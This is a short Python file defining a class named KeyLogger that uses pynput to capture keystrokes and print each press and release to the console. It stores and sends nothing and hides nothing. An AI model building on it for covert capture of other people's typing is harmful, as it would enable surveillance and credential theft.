from pynput import keyboard

class KeyLogger:

    def on_press(key):
        print(f'{key} pressed')

    def on_release(key):
        print(f'{key} released')

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()